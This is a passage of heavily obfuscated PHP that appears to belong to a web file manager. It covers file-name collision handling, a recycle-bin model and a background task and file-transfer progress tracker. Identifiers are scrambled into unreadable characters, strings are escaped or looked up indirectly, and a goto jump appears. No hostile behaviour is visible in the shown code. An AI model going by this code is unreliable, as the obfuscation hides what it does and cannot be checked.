$”²ö–ô = KodIO::fileTypeList(); foreach ($”²ö–ô as $­¥ è¶ˆ => $öÔÜÙÚÄ) { $åÓ×Î õ[$â‡Ãüô‹[488]] = $this->fileTypeWhere($­¥ è¶ˆ); $Õè†Îáİ[$­¥ è¶ˆ] = array($â‡Ãüô‹[2314] => $öÔÜÙÚÄ[$â‡Ãüô‹[32]], $â‡Ãüô‹[2315] => $this->where($åÓ×Î õ)->count(), $â‡Ãüô‹[624] => $this->where($åÓ×Î õ)->sum($â‡Ãüô‹[79])); } Cache::set($ö”Şùá, $Õè†Îáİ, 1200); return $Õè†Îáİ; } public function fileNameExist($„åØŒÏ¨, $Ã”·çª) { $ØŞóé¥á =& $_SERVER[†ûãı«°]; $ø‡˜“Š = $this->field($ØŞóé¥á[2316])->where(array($ØŞóé¥á[192] => $„åØŒÏ¨, $ØŞóé¥á[32] => $Ã”·çª, $ØŞóé¥á[507] => 0))->find(); return is_array($ø‡˜“Š) ? $ø‡˜“Š[$ØŞóé¥á[193]] : !1; } public function childList($¿Ü«’Çù) { $½ëÒ†Ö =& $_SERVER[†ûãı«°]; $ßÑº·ø  = $½ëÒ†Ö[2289] . $¿Ü«’Çù; if (isset(self::$cacheChildList[$ßÑº·ø ])) { return self::$cacheChildList[$ßÑº·ø ]; } $ëªÄ ã­ = array($½ëÒ†Ö[192] => intval($¿Ü«’Çù), $½ëÒ†Ö[507] => 0); $ó­ÈÈí× = $this->where($ëªÄ ã­)->select(); $ó­ÈÈí× = $ó­ÈÈí× ? $ó­ÈÈí× : array(); self::$cacheChildList[$ßÑº·ø ] = $ó­ÈÈí×; foreach ($ó­ÈÈí× as $§™Ì¥Ë¼) { $ßÑº·ø  = $½ëÒ†Ö[535] . $§™Ì¥Ë¼[$½ëÒ†Ö[193]]; self::$cacheSourceInfo[$ßÑº·ø ] = $§™Ì¥Ë¼; } return $ó­ÈÈí×; } public function fileNameAuto($ù‹îôùõ, $£ÌÆïãÚ, $ù¦œÊö­ = REPEAT_RENAME, $ûÖ‚áÆ = false) { $‰£å”ñÔ =& $_SERVER[†ûãı«°]; $òÑéŒâ• = get_path_ext($£ÌÆïãÚ); $‚àµ§êî = $òÑéŒâ• ? get_path_ext_name($£ÌÆïãÚ) . $‰£å”ñÔ[2317] . $òÑéŒâ• : $£ÌÆïãÚ . $‰£å”ñÔ[462]; $–ÏÒåŸ = array($‰£å”ñÔ[192] => $ù‹îôùõ, $‰£å”ñÔ[507] => 0, $‰£å”ñÔ[32] => array($‰£å”ñÔ[461], $‚àµ§êî)); $²ƒñÌ§³ = $this->field($‰£å”ñÔ[32])->where($–ÏÒåŸ)->select(); $ÛÁâ´¦û = array_to_keyvalue($²ƒñÌ§³, $‰£å”ñÔ[12], $‰£å”ñÔ[32]); return $this->fileNameAutoGet($ÛÁâ´¦û, $£ÌÆïãÚ, $ù¦œÊö­, $ûÖ‚áÆ); } public function fileNameAutoGet($§Üò—Áø, $Ù©ßÎğ½, $Ù›ç™¸Ã, $×Íš“àÌ) { $Æ¼¿š‡à =& $_SERVER[†ûãı«°]; if ($Ù›ç™¸Ã == REPEAT_REPLACE || !$§Üò—Áø || !in_array_not_case($Ù©ßÎğ½, $§Üò—Áø) || $×Íš“àÌ && $Ù›ç™¸Ã != REPEAT_RENAME_FOLDER) { return $Ù©ßÎğ½; } if ($Ù›ç™¸Ã == REPEAT_SKIP) { return !1; } $ÔÄÉâÕ = $Æ¼¿š‡à[10] . get_path_ext($Ù©ßÎğ½); $ÔÄÉâÕ = $ÔÄÉâÕ == $Æ¼¿š‡à[10] || $×Íš“àÌ ? $Æ¼¿š‡à[12] : $ÔÄÉâÕ; for ($Ÿ™‡øÏ = 1; $Ÿ™‡øÏ <= count($§Üò—Áø) + 1; $Ÿ™‡øÏ++) { $—ıÄ„Åš = substr($Ù©ßÎğ½, 0, strlen($Ù©ßÎğ½) - strlen($ÔÄÉâÕ)); $¹´Ò÷±¥ = $—ıÄ„Åš . "\50{$Ÿ™‡øÏ}\x29{$ÔÄÉâÕ}"; if (!in_array_not_case($¹´Ò÷±¥, $§Üò—Áø)) { return $¹´Ò÷±¥; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\x63\x65\x5f\x72\145\x63\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\151\155\145", "\x74\151\x6d\145", "\151\156\163\145\x72\164", "\146\165\156\x63\164\151\x6f\156")); public function listData($Ñî±©Ã§ = false) { $¾°´˜–Ï =& $_SERVER[†ûãı«°]; $Ñî±©Ã§ = $Ñî±©Ã§ ? $Ñî±©Ã§ : USER_ID; $Å²½´ = $this->where(array($¾°´˜–Ï[1774] => $Ñî±©Ã§))->select(); return array_to_keyvalue($Å²½´, $¾°´˜–Ï[12], $¾°´˜–Ï[193]); } public function moveToRecycle($îÅÜ›Û) { $´Ä´ÄË =& $_SERVER[†ûãı«°]; $¿­‰ÅŸê = Model($´Ä´ÄË[1432]); $“©ªšÎ = $¿­‰ÅŸê->sourceInfo($îÅÜ›Û); if (!$“©ªšÎ || $“©ªšÎ[$´Ä´ÄË[507]] == $´Ä´ÄË[91]) { return; } $½‘ıÒ÷õ = array($´Ä´ÄË[493] => $îÅÜ›Û, $´Ä´ÄË[1774] => USER_ID, $´Ä´ÄË[655] => $“©ªšÎ[$´Ä´ÄË[190]], $´Ä´ÄË[656] => $“©ªšÎ[$´Ä´ÄË[573]], $´Ä´ÄË[659] => $“©ªšÎ[$´Ä´ÄË[588]]); $this->add($½‘ıÒ÷õ); $this->recycleMove($îÅÜ›Û, 1); if ($“©ªšÎ[$´Ä´ÄË[487]] == $´Ä´ÄË[91]) { $õÔİÙÊĞ = array($´Ä´ÄË[659] => array($´Ä´ÄË[619], $“©ªšÎ[$´Ä´ÄË[588]] . $îÅÜ›Û . $´Ä´ÄË[620])); $¿­‰ÅŸê->where($õÔİÙÊĞ)->setField($´Ä´ÄË[507], 1); } } public function clear() { $this->remove(!1); } public function remove($¾›÷£Ò¿ = false, $‹ìšˆÄ¯ = false) { $Â•ìµìã =& $_SERVER[†ûãı«°]; $‹ìšˆÄ¯ = $‹ìšˆÄ¯ ? $‹ìšˆÄ¯ : USER_ID; $ğ¨òÀ™ = Model($Â•ìµìã[1432]); $ó¸ùÊ›» = $this->listData($‹ìšˆÄ¯); $¾›÷£Ò¿ = $¾›÷£Ò¿ === !1 ? !1 : $¾›÷£Ò¿; $ÙçúÕñÍ = array(); foreach ($ó¸ùÊ›» as $©µïã¾³) { if ($¾›÷£Ò¿ != !1 && !in_array($©µïã¾³, $¾›÷£Ò¿)) { continue; } $ƒ’èË¶Ò = $ğ¨òÀ™->sourceInfo($©µïã¾³); $ğ¨òÀ™->remove($©µïã¾³, !1); $ëÁ‘ïÅİ = $ƒ’èË¶Ò[$Â•ìµìã[190]] . $Â•ìµìã[11] . $ƒ’èË¶Ò[$Â•ìµìã[573]]; $ÙçúÕñÍ[$ëÁ‘ïÅİ] = array($Â•ìµìã[655] => $ƒ’èË¶Ò[$Â•ìµìã[190]], $Â•ìµìã[573] => $ƒ’èË¶Ò[$Â•ìµìã[573]]); $this->where(array($Â•ìµìã[193] => $©µïã¾³))->delete(); } foreach ($ÙçúÕñÍ as $ãÃÖêÏ) { $ğ¨òÀ™->targetSpaceUpdate($ãÃÖêÏ[$Â•ìµìã[190]], $ãÃÖêÏ[$Â•ìµìã[573]]); } } public function restore($ñ¼Ñç½ç = false) { $¯öûÔ… = $this->listData(); $this->_restoreSource($¯öûÔ…, $ñ¼Ñç½ç); } public function removeUserAll($ä¡¸Ò£) { $this->remove(!1, $ä¡¸Ò£); } public function restoreItem($¢ÎÊóÑ) { $this->_restoreSource(array($¢ÎÊóÑ), array($¢ÎÊóÑ)); } private function _restoreSource($Öéã îâ, $îïİŒ™¢) { $ê» í„¡ =& $_SERVER[†ûãı«°]; $‰Á¬É¾Ï = Model($ê» í„¡[1432]); $îïİŒ™¢ = $îïİŒ™¢ == !1 ? !1 : $îïİŒ™¢; if (!$Öéã îâ) { return !0; } $–€ÖÆñè = array(); foreach ($Öéã îâ as $½û¾Æ») { if ($îïİŒ™¢ != !1 && !in_array($½û¾Æ», $îïİŒ™¢)) { continue; } $ñ·£èí™ = $‰Á¬É¾Ï->sourceInfo($½û¾Æ»); $ÁÍ¯íƒ = $‰Á¬É¾Ï->sourceInfo($ñ·£èí™[$ê» í„¡[192]]); if ($ÁÍ¯íƒ[$ê» í„¡[507]] == $ê» í„¡[91]) { continue; } $‰Á¬É¾Ï->lockMoveStart($½û¾Æ»); $this->recycleMove($½û¾Æ», 0); if ($ñ·£èí™[$ê» í„¡[487]] == $ê» í„¡[91]) { $Ç¾­¼³è = array($ê» í„¡[659] => array($ê» í„¡[619], $ñ·£èí™[$ê» í„¡[588]] . $½û¾Æ» . $ê» í„¡[620])); $‰Á¬É¾Ï->where($Ç¾­¼³è)->setField($ê» í„¡[507], 0); $this->restoreFolderChildren($½û¾Æ», $Öéã îâ); } $this->where(array($ê» í„¡[193] => $½û¾Æ»))->delete(); $‰Á¬É¾Ï->folderSizeReset($ñ·£èí™[$ê» í„¡[192]]); $–€ÖÆñè[] = $ñ·£èí™[$ê» í„¡[192]]; if ($ñ·£èí™[$ê» í„¡[487]] == $ê» í„¡[91]) { $–€ÖÆñè[] = $½û¾Æ»; } $‰Á¬É¾Ï->lockMoveEnd($½û¾Æ»); } $‰Á¬É¾Ï->updateModifyTime($–€ÖÆñè); } private function restoreFolderChildren($¯À­Æº, $éÄëË£¸) { $ÈñÌ¯›â =& $_SERVER[†ûãı«°]; $éÂ•Êôˆ = Model($ÈñÌ¯›â[1432]); $ÛÁûŸšã = array($ÈñÌ¯›â[193] => array($ÈñÌ¯›â[7], array())); foreach ($éÄëË£¸ as $ğ·™ü˜á) { if ($ğ·™ü˜á == $¯À­Æº) { continue; } if (!$éÂ•Êôˆ->isParentOf($¯À­Æº, $ğ·™ü˜á)) { continue; } $Â¼–ïó = $éÂ•Êôˆ->sourceInfo($ğ·™ü˜á); if ($Â¼–ïó[$ÈñÌ¯›â[487]] == $ÈñÌ¯›â[91]) { $ÛÁûŸšã[] = array($ÈñÌ¯›â[659] => array($ÈñÌ¯›â[619], $Â¼–ïó[$ÈñÌ¯›â[588]] . $ğ·™ü˜á . $ÈñÌ¯›â[620])); } else { $ÛÁûŸšã[$ÈñÌ¯›â[193]][1][] = $ğ·™ü˜á; } } if (!$ÛÁûŸšã[$ÈñÌ¯›â[193]][1]) { unset($ÛÁûŸšã[$ÈñÌ¯›â[193]]); } if (!$ÛÁûŸšã) { return; } if (is_array($ÛÁûŸšã[$ÈñÌ¯›â[193]]) && is_array($ÛÁûŸšã[$ÈñÌ¯›â[193]][1])) { $ÛÁûŸšã[$ÈñÌ¯›â[193]][1] = array_unique($ÛÁûŸšã[$ÈñÌ¯›â[193]][1]); } $ÛÁûŸšã[$ÈñÌ¯›â[1088]] = $ÈñÌ¯›â[2086]; $éÂ•Êôˆ->where($ÛÁûŸšã)->setField($ÈñÌ¯›â[507], 1); } private function recycleMove($¬›…‹‚, $­ò•—§ï = 1) { $­ºİ™Ìä =& $_SERVER[†ûãı«°]; $²™©ë¹Ä = Model($­ºİ™Ìä[1432]); $‰œ¡“ÕÏ = Model($­ºİ™Ìä[2318]); $Î¶òíÈ¿ = array($­ºİ™Ìä[193] => $¬›…‹‚); if ($­ò•—§ï) { $²™©ë¹Ä->where($Î¶òíÈ¿)->setField($­ºİ™Ìä[507], 1); $‰œ¡“ÕÏ->eventRecycle($¬›…‹‚, $­ºİ™Ìä[2319]); } else { $ªææ°¦® = $²™©ë¹Ä->where($Î¶òíÈ¿)->find(); $îÀ“ÎÍ® = $ªææ°¦®[$­ºİ™Ìä[487]] == $­ºİ™Ìä[91]; $ë¸Ø–Ë = $²™©ë¹Ä->fileNameAuto($ªææ°¦®[$­ºİ™Ìä[192]], $ªææ°¦®[$­ºİ™Ìä[32]], REPEAT_RENAME_FOLDER, $îÀ“ÎÍ®); if ($ë¸Ø–Ë != $ªææ°¦®[$­ºİ™Ìä[32]]) { $²™©ë¹Ä->rename($¬›…‹‚, $ë¸Ø–Ë); } $²™©ë¹Ä->where($Î¶òíÈ¿)->setField($­ºİ™Ìä[507], 0); $‰œ¡“ÕÏ->eventRecycle($¬›…‹‚, $­ºİ™Ìä[2320]); } } } goto Bƒ¿Èèø‚; Dšğªå: class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\156\151\x6e\147"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($øœÙø, $¥•æ±¡ = '', $¬ßìŒ¤š = 0, $†»òí‚ı = '') { $éµ†‚É =& $_SERVER[†ûãı«°]; if (self::get($øœÙø)) { return; } $this->task = array($éµ†‚É[477] => $øœÙø, $éµ†‚É[1783] => USER_ID, $éµ†‚É[1671] => $†»òí‚ı, $éµ†‚É[528] => $éµ†‚É[12], $éµ†‚É[33] => $¥•æ±¡, $éµ†‚É[1153] => $éµ†‚É[12], $éµ†‚É[1151] => $¬ßìŒ¤š, $éµ†‚É[1784] => 0, $éµ†‚É[1785] => 0, $éµ†‚É[1786] => 0, $éµ†‚É[1787] => timeFloat(), $éµ†‚É[1788] => 0, $éµ†‚É[1789] => 0, $éµ†‚É[1790] => 0, $éµ†‚É[1791] => 0, $éµ†‚É[826] => $éµ†‚É[1732]); $GLOBALS[$éµ†‚É[1792]] = 1; Hook::bind($éµ†‚É[1736], array($this, $éµ†‚É[1793])); Hook::bind($éµ†‚É[1794], array($this, $éµ†‚É[1795])); $this->startAfter(); Hook::trigger($éµ†‚É[1796], $this->task); $this->task[$éµ†‚É[1789]] = timeFloat(); } public function end($¥Ò¶ê« = '') { $Ğ¥ñ»º =& $_SERVER[†ûãı«°]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ğ¥ñ»º[1789]]) { self::valueSet($this->task[$Ğ¥ñ»º[477]], !1); } $this->isEnd = !0; if ($¥Ò¶ê«) { $this->task[$Ğ¥ñ»º[528]] = $¥Ò¶ê«; } self::log($Ğ¥ñ»º[1797] . $this->task[$Ğ¥ñ»º[477]] . $Ğ¥ñ»º[1798] . sprintf($Ğ¥ñ»º[933], timeFloat() - $this->task[$Ğ¥ñ»º[1787]]) . $Ğ¥ñ»º[1799]); Hook::unbind($Ğ¥ñ»º[1736], array($this, $Ğ¥ñ»º[1793])); Hook::unbind($Ğ¥ñ»º[1794], array($this, $Ğ¥ñ»º[1795])); $this->endAfter(); $×’Š¬Õ‹ = $this->task; $this->task = !1; Hook::trigger($Ğ¥ñ»º[1800], $×’Š¬Õ‹); } public function update($â–¹›ôÌ = 0, $¾ßÊ‘»ù = false) { $¿˜¼›³é =& $_SERVER[†ûãı«°]; $´³ÁØ·¥ =& $this->task; if (!$´³ÁØ·¥) { return; } $´³ÁØ·¥[$¿˜¼›³é[1784]] += $â–¹›ôÌ; $´³ÁØ·¥[$¿˜¼›³é[1788]] = timeFloat(); if ($´³ÁØ·¥[$¿˜¼›³é[1151]]) { if ($´³ÁØ·¥[$¿˜¼›³é[1151]] < $´³ÁØ·¥[$¿˜¼›³é[1784]]) { $´³ÁØ·¥[$¿˜¼›³é[1151]] = $´³ÁØ·¥[$¿˜¼›³é[1784]]; } $ŒÂ‚…Ñ³ = timeFloat() - $´³ÁØ·¥[$¿˜¼›³é[1787]] - $´³ÁØ·¥[$¿˜¼›³é[1790]]; if ($ŒÂ‚…Ñ³ <= 0) { $ŒÂ‚…Ñ³ = 0.001; } $´³ÁØ·¥[$¿˜¼›³é[1785]] = $´³ÁØ·¥[$¿˜¼›³é[1784]] / $´³ÁØ·¥[$¿˜¼›³é[1151]]; $´³ÁØ·¥[$¿˜¼›³é[1786]] = $´³ÁØ·¥[$¿˜¼›³é[1784]] / $ŒÂ‚…Ñ³; if ($´³ÁØ·¥[$¿˜¼›³é[1785]] > 0) { $´³ÁØ·¥[$¿˜¼›³é[1791]] = $ŒÂ‚…Ñ³ * (1 - $´³ÁØ·¥[$¿˜¼›³é[1785]]) / $´³ÁØ·¥[$¿˜¼›³é[1785]]; } $´³ÁØ·¥[$¿˜¼›³é[1791]] = $´³ÁØ·¥[$¿˜¼›³é[1791]] <= 0 ? 0 : $´³ÁØ·¥[$¿˜¼›³é[1791]]; } $this->updateAfter(); $ÃÛ¡éµ³ = 0.2; if (timeFloat() - $´³ÁØ·¥[$¿˜¼›³é[1789]] < $ÃÛ¡éµ³ && !$¾ßÊ‘»ù) { return; } $œÆúÃÓ = self::get($´³ÁØ·¥[$¿˜¼›³é[477]]); $ÅøÙæÄÌ = $œÆúÃÓ[$¿˜¼›³é[826]]; if ($ÅøÙæÄÌ == self::STATYS_KILL) { $Æ‡âéÀ€ = array($¿˜¼›³é[1801] => LNG($¿˜¼›³é[1802]), $¿˜¼›³é[1308] => !1); Cache::set($¿˜¼›³é[1803] . $this->task[$¿˜¼›³é[477]], $Æ‡âéÀ€, 30); $this->onKill(); $this->end(); die; } else { if ($ÅøÙæÄÌ == self::STATYS_STOP) { $“•‡¼üç = 2; $œÆúÃÓ[$¿˜¼›³é[1790]] += $“•‡¼üç; self::valueSet($´³ÁØ·¥[$¿˜¼›³é[477]], $œÆúÃÓ); sleep($“•‡¼üç); $this->update(); return; } } $´³ÁØ·¥[$¿˜¼›³é[826]] = $ÅøÙæÄÌ ? $ÅøÙæÄÌ : $´³ÁØ·¥[$¿˜¼›³é[826]]; $´³ÁØ·¥[$¿˜¼›³é[1790]] = $œÆúÃÓ[$¿˜¼›³é[1790]] ? $œÆúÃÓ[$¿˜¼›³é[1790]] : 0; $´³ÁØ·¥[$¿˜¼›³é[1789]] = timeFloat(); Hook::trigger($¿˜¼›³é[1804], $´³ÁØ·¥); self::valueSet($´³ÁØ·¥[$¿˜¼›³é[477]], $´³ÁØ·¥); } public function onKillSet($îûÙ¦Öâ, $ä«ßÀœä = array()) { $this->onKillCall = array($îûÙ¦Öâ, $ä«ßÀœä); } public function onKill() { $­æöüğ€ =& $_SERVER[†ûãı«°]; self::log($­æöüğ€[1797] . $this->task[$­æöüğ€[477]] . $­æöüğ€[1805]); Hook::trigger($­æöüğ€[1806], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¸¥Ó¡Š¨) { $Œ¹ë¾Ùß =& $_SERVER[†ûãı«°]; Cache::set($Œ¹ë¾Ùß[1803] . $this->task[$Œ¹ë¾Ùß[477]], $¸¥Ó¡Š¨, 60); if (!is_array($¸¥Ó¡Š¨) || !$¸¥Ó¡Š¨[$Œ¹ë¾Ùß[1308]]) { self::log($Œ¹ë¾Ùß[1807] . json_encode($¸¥Ó¡Š¨)); } return $¸¥Ó¡Š¨; } public static function get($Ÿ“Ï´³š) { $¨ÂéûÊÃ =& $_SERVER[†ûãı«°]; $áÓ´­© = self::valueGet($Ÿ“Ï´³š); if (is_array($áÓ´­©) && $áÓ´­©[$¨ÂéûÊÃ[1808]]) { $†×Œ¾ß = ActionApply($áÓ´­©[$¨ÂéûÊÃ[1808]], array($áÓ´­©)); $áÓ´­© = is_array($†×Œ¾ß) ? $†×Œ¾ß : $áÓ´­©; } return $áÓ´­©; } public static function listData() { $ƒ›í×·¯ = self::valueGet(); return array_sort_by($ƒ›í×·¯, $_SERVER[†ûãı«°][1787], !0); } public static function kill($Ø¥¡¤·¦) { return self::changeStatus($Ø¥¡¤·¦, self::STATYS_KILL); } public static function stop($±˜ æøü) { return self::changeStatus($±˜ æøü, self::STATYS_STOP); } public static function restart($´°¼îÄÄ) { return self::changeStatus($´°¼îÄÄ, self::STATYS_RUNNING); } public static function killAll() { $©ªù…Ó =& $_SERVER[†ûãı«°]; $„áÛÈã» = self::listData(); foreach ($„áÛÈã» as $£ˆ‘Ê¢) { self::kill($£ˆ‘Ê¢[$©ªù…Ó[477]]); } sleep(2); foreach ($„áÛÈã» as $£ˆ‘Ê¢) { self::valueSet($£ˆ‘Ê¢[$©ªù…Ó[477]], !1); } } private static function changeStatus($–ªÏÊ…, $€¨è”‚Œ) { $âİş‚÷ =& $_SERVER[†ûãı«°]; $æô·¦âÙ = self::valueGet($–ªÏÊ…); if (!$æô·¦âÙ) { return !1; } $æô·¦âÙ[$âİş‚÷[826]] = $€¨è”‚Œ; self::valueSet($–ªÏÊ…, $æô·¦âÙ); self::log($âİş‚÷[1809] . $æô·¦âÙ[$âİş‚÷[477]] . $âİş‚÷[1810] . $€¨è”‚Œ); return !0; } public static function valueGet($˜ıñİİ = false) { $™áªâïÓ =& $_SERVER[†ûãı«°]; if ($˜ıñİİ) { $êµ‡›½à = Model($™áªâïÓ[522])->where(array($™áªâïÓ[97] => $˜ıñİİ, $™áªâïÓ[33] => $™áªâïÓ[1160]))->find(); return $êµ‡›½à ? json_decode($êµ‡›½à[$™áªâïÓ[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($‡Áõ‡Ùº = false) { $›£®Ğû =& $_SERVER[†ûãı«°]; $” —ŸÆö = array($›£®Ğû[33] => $›£®Ğû[1160]); if ($‡Áõ‡Ùº) { $” —ŸÆö[$›£®Ğû[1783]] = $‡Áõ‡Ùº; } $—§‰à±Ä = Model($›£®Ğû[522])->where($” —ŸÆö)->select(); $—§‰à±Ä = $—§‰à±Ä ? $—§‰à±Ä : array(); foreach ($—§‰à±Ä as $Ú¤š÷ê² => $“îéêİò) { $—§‰à±Ä[$Ú¤š÷ê²] = json_decode($“îéêİò[$›£®Ğû[452]], !0); } return $—§‰à±Ä; } public static function valueSet($ŠÛò­Ó, $öü°äÚİ) { $Ğ¨ƒùûÉ =& $_SERVER[†ûãı«°]; if (!$öü°äÚİ) { return Model($Ğ¨ƒùûÉ[522])->where(array($Ğ¨ƒùûÉ[97] => $ŠÛò­Ó, $Ğ¨ƒùûÉ[33] => $Ğ¨ƒùûÉ[1160]))->delete(); } $ãÊğßê = json_encode($öü°äÚİ); if (!$ãÊğßê) { ob_start(); var_dump($öü°äÚİ); $ï¤’»Ãº = ob_get_clean(); self::log($Ğ¨ƒùûÉ[1811] . json_encode_force($ï¤’»Ãº)); } if (!$ŠÛò­Ó || !$öü°äÚİ[$Ğ¨ƒùûÉ[477]]) { return !1; } $¼ëå·¶Ã = array($Ğ¨ƒùûÉ[33] => $Ğ¨ƒùûÉ[1160], $Ğ¨ƒùûÉ[1783] => USER_ID, $Ğ¨ƒùûÉ[97] => $ŠÛò­Ó, $Ğ¨ƒùûÉ[452] => $ãÊğßê); $äÏ¥Ş€‚ = $Ğ¨ƒùûÉ[1812]; CacheLock::lock($äÏ¥Ş€‚); Model($Ğ¨ƒùûÉ[522])->add($¼ëå·¶Ã, array(), !0); CacheLock::unlock($äÏ¥Ş€‚); } public static function log($ëö±·“) { if (!GLOBAL_DEBUG) { return; } write_log($ëö±·“, $_SERVER[†ûãı«°][1813]); } } class TaskFileTransfer extends Task { protected function startAfter() { $‘¾‘œó¤ =& $_SERVER[†ûãı«°]; $§ë¾Ã×¸ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($‘¾‘œó¤[1814], array($this, $‘¾‘œó¤[1815])); Hook::bind($‘¾‘œó¤[1319], array($this, $‘¾‘œó¤[1816])); Hook::bind($‘¾‘œó¤[1817], array($this, $‘¾‘œó¤[1818])); Hook::bind($‘¾‘œó¤[675], array($this, $‘¾‘œó¤[1819])); Hook::bind($‘¾‘œó¤[676], array($this, $‘¾‘œó¤[1820])); Hook::bind($‘¾‘œó¤[682], array($this, $‘¾‘œó¤[1821])); Hook::bind($‘¾‘œó¤[683], array($this, $‘¾‘œó¤[1822])); Hook::bind($‘¾‘œó¤[678], array($this, $‘¾‘œó¤[1823])); Hook::bind($‘¾‘œó¤[680], array($this, $‘¾‘œó¤[1824])); Hook::bind($‘¾‘œó¤[644], array($this, $‘¾‘œó¤[1825])); Hook::bind($‘¾‘œó¤[641], array($this, $‘¾‘œó¤[1825])); Hook::bind($‘¾‘œó¤[646], array($this, $‘¾‘œó¤[1825])); Hook::bind($‘¾‘œó¤[648], array($this, $‘¾‘œó¤[1825])); Hook::bind($‘¾‘œó¤[650], array($this, $‘¾‘œó¤[1825])); Hook::bind($‘¾‘œó¤[1826], array($this, $‘¾‘œó¤[1827])); Hook::bind($‘¾‘œó¤[666], array($this, $‘¾‘œó¤[1828])); $this->sourceModelCopyFlag = !1; Hook::bind($‘¾‘œó¤[1829], array($this, $‘¾‘œó¤[1830])); Hook::bind($‘¾‘œó¤[1831], array($this, $‘¾‘œó¤[1832])); Hook::bind($‘¾‘œó¤[1833], array($this, $‘¾‘œó¤[1834])); $§ë¾Ã×¸[$‘¾‘œó¤[1835]] = LNG($‘¾‘œó¤[1836]); $§ë¾Ã×¸[$‘¾‘œó¤[1837]] = 0; $§ë¾Ã×¸[$‘¾‘œó¤[1838]] = 0; $§ë¾Ã×¸[$‘¾‘œó¤[1153]] = $‘¾‘œó¤[12]; $§ë¾Ã×¸[$‘¾‘œó¤[1839]] = $‘¾‘œó¤[12]; $§ë¾Ã×¸[$‘¾‘œó¤[1840]] = 0; $§ë¾Ã×¸[$‘¾‘œó¤[1841]] = 0; $§ë¾Ã×¸[$‘¾‘œó¤[1842]] = 0; if (!$§ë¾Ã×¸[$‘¾‘œó¤[1671]]) { $§ë¾Ã×¸[$‘¾‘œó¤[1671]] = LNG($‘¾‘œó¤[1843]); } } protected function endAfter() { $İ£ŒèÙİ =& $_SERVER[†ûãı«°]; Hook::unbind($İ£ŒèÙİ[1814], array($this, $İ£ŒèÙİ[1815])); Hook::unbind($İ£ŒèÙİ[1319], array($this, $İ£ŒèÙİ[1816])); Hook::unbind($İ£ŒèÙİ[1817], array($this, $İ£ŒèÙİ[1818])); Hook::unbind($İ£ŒèÙİ[675], array($this, $İ£ŒèÙİ[1819])); Hook::unbind($İ£ŒèÙİ[676], array($this, $İ£ŒèÙİ[1820])); Hook::unbind($İ£ŒèÙİ[682], array($this, $İ£ŒèÙİ[1821])); Hook::unbind($İ£ŒèÙİ[683], array($this, $İ£ŒèÙİ[1822])); Hook::unbind($İ£ŒèÙİ[678], array($this, $İ£ŒèÙİ[1823])); Hook::unbind($İ£ŒèÙİ[680], array($this, $İ£ŒèÙİ[1824])); Hook::unbind($İ£ŒèÙİ[644], array($this, $İ£ŒèÙİ[1825])); Hook::unbind($İ£ŒèÙİ[641], array($this, $İ£ŒèÙİ[1825])); Hook::unbind($İ£ŒèÙİ[646], array($this, $İ£ŒèÙİ[1825])); Hook::unbind($İ£ŒèÙİ[648], array($this, $İ£ŒèÙİ[1825])); Hook::unbind($İ£ŒèÙİ[650], array($this, $İ£ŒèÙİ[1825])); Hook::unbind($İ£ŒèÙİ[1826], array($this, $İ£ŒèÙİ[1827])); Hook::unbind($İ£ŒèÙİ[666], array($this, $İ£ŒèÙİ[1828])); Hook::unbind($İ£ŒèÙİ[1829], array($this, $İ£ŒèÙİ[1830])); Hook::unbind($İ£ŒèÙİ[1831], array($this, $İ£ŒèÙİ[1832])); Hook::unbind($İ£ŒèÙİ[1833], array($this, $İ£ŒèÙİ[1834])); } public function copyMoveStart($ÛÓå‚½Ö, $ù”ËÈ º, $¨ƒî®§§, $ÖõÛ£ğ») { $ÁôŞ¦“ =& $_SERVER[†ûãı«°]; self::log($ÁôŞ¦“[1844] . $ù”ËÈ º . $ÁôŞ¦“[73] . $ÖõÛ£ğ»); $«ÂïÜ… = rtrim(TEMP_FILES, $ÁôŞ¦“[8]); if (substr($ù”ËÈ º, 0, strlen($«ÂïÜ…)) == $«ÂïÜ…) { return; } if (substr($ÖõÛ£ğ», 0, strlen($«ÂïÜ…)) == $«ÂïÜ…) { return; } $İü´Å…Ú =& $this->task; $İü´Å…Ú[$ÁôŞ¦“[1845]] = KodIO::transferType($ÛÓå‚½Ö, $¨ƒî®§§); $this->update(); } public function updateAfter() { $ò–âúÛÆ =& $_SERVER[†ûãı«°]; $ìåÓŠöú =& $this->task; if (!$ìåÓŠöú[$ò–âúÛÆ[839]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ìåÓŠöú[$ò–âúÛÆ[1845]] == $ò–âúÛÆ[1413]) { return; } self::updateTask($ìåÓŠöú); } private static function updateTask(&$ÕËæ²¶ì) { $¾ôí©í› =& $_SERVER[†ûãı«°]; if ($ÕËæ²¶ì[$¾ôí©í›[1845]] == $¾ôí©í›[1290] || $ÕËæ²¶ì[$¾ôí©í›[1845]] == $¾ôí©í›[110]) { if ($ÕËæ²¶ì[$¾ôí©í›[1839]]) { $ÕËæ²¶ì[$¾ôí©í›[1842]] = $ÕËæ²¶ì[$¾ôí©í›[1841]] + $ÕËæ²¶ì[$¾ôí©í›[1838]]; } } else { if ($ÕËæ²¶ì[$¾ôí©í›[1845]] == $¾ôí©í›[1414]) { if ($ÕËæ²¶ì[$¾ôí©í›[1839]] == $¾ôí©í›[1290]) { $ÕËæ²¶ì[$¾ôí©í›[1842]] = $ÕËæ²¶ì[$¾ôí©í›[1841]] + $ÕËæ²¶ì[$¾ôí©í›[1838]] * 0.5; } else { if ($ÕËæ²¶ì[$¾ôí©í›[1839]] == $¾ôí©í›[110]) { $ÕËæ²¶ì[$¾ôí©í›[1842]] = $ÕËæ²¶ì[$¾ôí©í›[1841]] + $ÕËæ²¶ì[$¾ôí©í›[1837]] * 0.5 + $ÕËæ²¶ì[$¾ôí©í›[1838]] * 0.5; } } } } $ÕËæ²¶ì[$¾ôí©í›[1785]] = 